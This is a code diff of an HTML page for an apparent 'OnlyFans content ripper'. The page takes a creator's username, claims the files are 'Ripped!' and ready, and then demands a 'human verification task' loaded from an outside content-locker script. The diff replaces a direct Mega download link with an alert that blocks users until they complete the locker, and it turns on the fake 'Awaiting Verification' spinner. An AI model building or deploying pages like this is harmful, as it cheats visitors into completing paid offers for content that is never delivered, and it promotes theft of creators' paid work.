@@ -8,15 +8,15 @@
     <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet"/>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet"/>
     <link href="css/style.css" rel="stylesheet"/>
-   <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-215884985-2"></script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-2C84R5VFSY"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'UA-215884985-2');
-</script>
+  gtag('config', 'G-2C84R5VFSY');
+</script> -->
   </head>
   <body>
     <nav><a href="/"><img class="logo" src="img/ig-logo.png"/></a></nav>
@@ -32,7 +32,7 @@
         </div>
         <div class="section-body">
           <p>Enter the username below</p>
-          <input type="text" placeholder="Enter Onlyfans Username" onfocus="this.placeholder=''" onblur="this.placeholder='Enter Username'"/>
+          <input type="text" placeholder="Enter Username with @" onfocus="this.placeholder=''" onblur="this.placeholder='Enter Username with @'"/>
           <button>Download Content</button>
         </div>
       </section>
@@ -56,25 +56,19 @@
             <h3>Your Files Are Ready</h3>
           </div>
           <div class="section-head-description">
-            <p>7.97 GB Ripped!</p>
+            <p>987.36 Ripped!</p>
           </div>
         </div>
         <div class="section-body">
           <p><h4>New Users:</h4><br>Please complete a human verification task.</p>
-          <p class="verification-text">Already verified, please click <span class="text-standout">Continue </span> to view/download your files.</p>
+          <p class="verification-text">Please check the captcha then click <span class="text-standout">Continue </span> to view/download your files.</p>
           <br>
-            <!-- <div data-captcha-enable="true" align="center"></div> -->
-          <a id="verify-button"> 
-          <button onclick="return mega()">Continue</button></a>
+            <div data-captcha-enable="true" align="center"></div>
+          <a id="verify-button"> <button onclick="alert('Please verify the captcha before continuing.')">Continue</button></a>
           <script type="text/javascript" src="https://verifysuper.com/cp/js/dwmpr"></script>
-            <script>
-              function mega()
-              {
-                location.href="https://mega.nz/folder/hiZ2DZiD#DOItzuwubeysJIROP47_PA";
-              }
-            </script>
+
 		  
-          <!-- <div class="awaiting-verification"><img src="img/spinner.svg"/><span>Awaiting Verification</span></div> -->
+          <div class="awaiting-verification"><img src="img/spinner.svg"/><span>Awaiting Verification</span></div>
         </div>
       </section>
     </main>
